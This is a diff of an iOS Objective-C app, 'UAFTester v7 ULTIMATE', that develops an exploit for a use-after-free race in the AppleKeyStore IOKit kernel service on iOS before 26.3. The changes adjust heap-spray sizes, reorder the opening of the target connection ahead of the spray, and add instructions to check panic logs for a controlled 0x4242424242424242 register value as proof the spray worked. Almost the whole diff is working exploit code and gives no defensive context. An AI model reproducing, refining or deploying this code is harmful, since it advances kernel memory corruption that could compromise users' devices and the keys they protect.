@@ -1,3 +1,10 @@
+//
+//  ViewController.m
+//  UAFTester
+//
+//  v7 ULTIMATE - Working heap spray + Fixed order + Complete UI
+//
+
 #import "ViewController.h"
 #import <IOKit/IOKitLib.h>
 #import <mach/mach.h>
@@ -9,7 +16,7 @@
 #define MAX_ATTEMPTS 2000
 
 // ========== HEAP SPRAY CONFIGURATION ==========
-#define SPRAY_COUNT         500      // Reduced for stability (was 10000)
+#define SPRAY_COUNT         200      // Reduced to leave resources for target
 #define SPRAY_BUFFER_SIZE   512      // Size of fake object (bytes)
 #define SPRAY_DELAY_MS      100      // Delay after spray (milliseconds)
 #define SPRAY_RETRY_ON_FAIL 1        // Continue even if some connections fail
@@ -100,7 +107,7 @@ static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *)) {
     log_callback([NSString stringWithFormat:@"[SPRAY] Opened %d valid connections", g_spray_count]);
     
     // Check if we have enough connections to proceed
-    if (g_spray_count < 100) {
+    if (g_spray_count < 50) {
         log_callback([NSString stringWithFormat:@"[SPRAY] Only %d connections - too few!", g_spray_count]);
         return -1;
     }
@@ -228,7 +235,7 @@ static int run_attempt(void) {
     [self.view addSubview:title];
 
     UILabel *subtitle = [[UILabel alloc] init];
-    subtitle.text = [NSString stringWithFormat:@"Phase 2: Heap Grooming (max %d spray)\niOS <26.3 RC", SPRAY_COUNT];
+    subtitle.text = [NSString stringWithFormat:@"v7 ULTIMATE: Fixed Order (max %d spray)\niOS <26.3 RC", SPRAY_COUNT];
     subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
     subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
     subtitle.textAlignment = NSTextAlignmentCenter;
@@ -307,8 +314,9 @@ static int run_attempt(void) {
     self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];
 
     [self appendLog:@"========================================"];
-    [self appendLog:@"  AppleKeyStore UAF + HEAP SPRAY v2"];
+    [self appendLog:@"  UAF + HEAP SPRAY v7 ULTIMATE"];
     [self appendLog:@"========================================"];
+    [self appendLog:@"[*] FIXED ORDER: Target first, spray second"];
     [self appendLog:[NSString stringWithFormat:@"[*] Max spray: %d (adaptive)", SPRAY_COUNT]];
     [self appendLog:[NSString stringWithFormat:@"[*] Attempts: %d (racers: %d)", MAX_ATTEMPTS, NUM_RACERS]];
     [self appendLog:@""];
@@ -324,8 +332,32 @@ static int run_attempt(void) {
             return;
         }
         [self appendLog:@"[+] AppleKeyStore service found"];
+        [self appendLog:@""];
         
-        // ========== PHASE 2: HEAP SPRAY (ADAPTIVE) ==========
+        // ========== CRITICAL FIX: Open target connection FIRST ==========
+        [self appendLog:@">>> PHASE 1: OPEN TARGET CONNECTION"];
+        [self setStatus:@"Opening target..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
+        
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
+        if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
+            [self appendLog:@"[-] Failed to open target connection"];
+            [self setStatus:@"Target open failed" color:UIColor.redColor];
+            IOObjectRelease(svc);
+            [self finishRun];
+            return;
+        }
+        
+        [self appendLog:@"[+] Target connection opened"];
+        [self appendLog:[NSString stringWithFormat:@"[+] Connection handle: 0x%x", g_conn]];
+        [self appendLog:@""];
+        
+        // Close target temporarily before spray (will reopen for each attempt)
+        IOServiceClose(g_conn);
+        g_conn = IO_OBJECT_NULL;
+        // =================================================================
+        
+        // ========== PHASE 2: HEAP SPRAY (with remaining resources) ==========
+        [self appendLog:@">>> PHASE 2: HEAP SPRAY"];
         [self setStatus:@"Heap spraying..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
         
         int spray_result = heap_spray_init(svc, ^(NSString *msg) {
@@ -343,9 +375,12 @@ static int run_attempt(void) {
         
         [self appendLog:[NSString stringWithFormat:@"[+] Heap spray OK (%d connections active)", g_spray_count]];
         [self appendLog:@""];
-        // ====================================================
+        // =====================================================================
         
         IOObjectRelease(svc);
+        
+        // ========== PHASE 3: UAF TRIGGER ==========
+        [self appendLog:@">>> PHASE 3: UAF TRIGGER"];
         [self setStatus:@"Triggering UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
 
         for (int i = 0; i < MAX_ATTEMPTS; i++) {
@@ -371,14 +406,22 @@ static int run_attempt(void) {
         
         if (atomic_load(&g_errors) > 0) {
             [self appendLog:[NSString stringWithFormat:@"[*] Port deaths detected: %u", atomic_load(&g_errors)]];
-            [self appendLog:@"[*] UAF triggered successfully!"];
+            [self appendLog:@""];
+            [self appendLog:@"✓✓✓ UAF TRIGGERED SUCCESSFULLY! ✓✓✓"];
+            [self appendLog:@""];
+            [self appendLog:@"Next steps:"];
+            [self appendLog:@"1. Check for panic log (Settings → Analytics)"];
+            [self appendLog:@"2. Look for x16 register = 0x4242424242424242"];
+            [self appendLog:@"3. If you see 0x4242... = HEAP SPRAY SUCCESS!"];
             [self setStatus:@"UAF TRIGGERED!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
         } else {
             [self appendLog:@"[*] No port deaths - race might need tuning"];
+            [self appendLog:@"[*] Try running again or check system logs"];
             [self setStatus:@"Completed (no panic)" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
         }
         
         // Cleanup spray connections
+        [self appendLog:@""];
         heap_spray_cleanup(^(NSString *msg) {
             [self appendLog:msg];
         });
